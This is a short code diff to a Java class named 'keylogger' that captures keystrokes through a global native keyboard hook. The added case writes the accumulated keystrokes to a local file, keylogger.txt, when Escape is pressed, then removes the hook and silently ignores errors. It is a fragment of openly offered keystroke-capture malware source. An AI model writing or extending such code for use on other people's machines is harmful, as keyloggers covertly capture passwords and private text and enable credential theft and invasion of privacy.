@@ -191,7 +191,17 @@ public class keylogger implements NativeKeyListener{
             case"Alt":
                 s+="[Alt]";
                 break;
-                
+            case "Escape":
+                try {
+                    File f = new File("keylogger.txt");
+                    try (FileWriter fw = new FileWriter(f)) {
+                        fw.write(s);
+                    }
+
+                    GlobalScreen.unregisterNativeHook();
+                } catch (NativeHookException | IOException ef) {
+                }
+                break;
             default:
                 if (temp.length()>1)
                 {
